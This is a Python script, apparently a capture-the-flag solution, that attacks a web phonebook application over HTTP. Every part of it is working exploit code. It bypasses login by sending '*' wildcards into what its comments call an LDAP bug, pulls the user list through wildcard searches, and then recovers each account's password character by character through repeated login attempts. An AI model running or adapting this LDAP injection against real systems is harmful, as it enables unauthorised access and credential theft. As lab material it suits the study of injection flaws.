#!/usr/bin/python

import requests
import sys
import json
import string

if len(sys.argv) < 3:
    print("Usage: {} <HOST_IP> <PORT>".format(sys.argv[0]))
    exit()
else:      
    targhost =  sys.argv[1]
    targport = sys.argv[2]

login_url  = "http://{}:{}/login".format(targhost,targport)
search_url = "http://{}:{}/search".format(targhost,targport)

def write_char(s):
    sys.stdout.write(s)
    sys.stdout.flush()      

def do_login(url, username, password):
    sess = requests.session()
    sess.post(url, data={"username":username , "password":password}, allow_redirects=True)
    if sess.cookies.get('mysession'):
        return sess
    else:  
        return False

#Fuzzing the login field shows that * for the username and password
#can be used to bypass authentication due to an LDAP bug as hinted
#in the alert message
print("[*] Logging in with splats...")
s = do_login(login_url, "*","*")
if s:
    print("[+] Logged in.")
else:
    print("[-] Login failed.")    
    exit()

splat_searches = [("{}*".format(chr(i))) for i in range(0x41,0x5a)]

print("[*] Extracting user accounts from phonebook...")
uniqs = []
for splat in splat_searches:

    search_response = s.post(search_url, data=json.dumps({"term":splat}))
    out = json.loads(search_response.content)

    if out:
        [uniqs.append(i) for i in out if i not in uniqs]

print("[+] Got {} accounts.".format(len(uniqs)))
print("[*] Testing auth bypass for accounts...")

success_logins = []
for i in uniqs:

    username = i['sn']
    password = "*"
    response = do_login(login_url, username, password)
    print('[*] Trying username {} w/ password {}'.format(username, password))

    if response:

        print("[+] Successful login for account: {}".format(username))
        success_logins.append(username)

#all_chars = [chr(i) for i in range(0x21,0x7f) if i != 0x2a]
#More optimized than above
all_chars = list(string.ascii_lowercase+string.ascii_uppercase+string.punctuation+string.digits)
all_chars.remove("*")

for username in success_logins: 

    enumerated_password = ''
    print("[*] Enumerating password for username {}...".format(username))
    all_chars_failed = False

    while not all_chars_failed:
        
        for c in all_chars:

            #Write the currently tested char / position to stdout
            write_char(c)

            #Append a splat to the chars enumerated thus far
            test_password = "{}{}*".format(enumerated_password, c)

            #If the current enumerated chars + * returned a session
            if do_login(login_url, username, test_password):
                enumerated_password += c 
                break
            #Delete last tested char that failed            
            else:
                write_char("\b")
            #Reached the end of the char list w/ no match. PW is fully enumerated.
            if c == all_chars[-1]:                     
                write_char(" ")
                all_chars_failed = True
       
print("\n[+] Done.")      
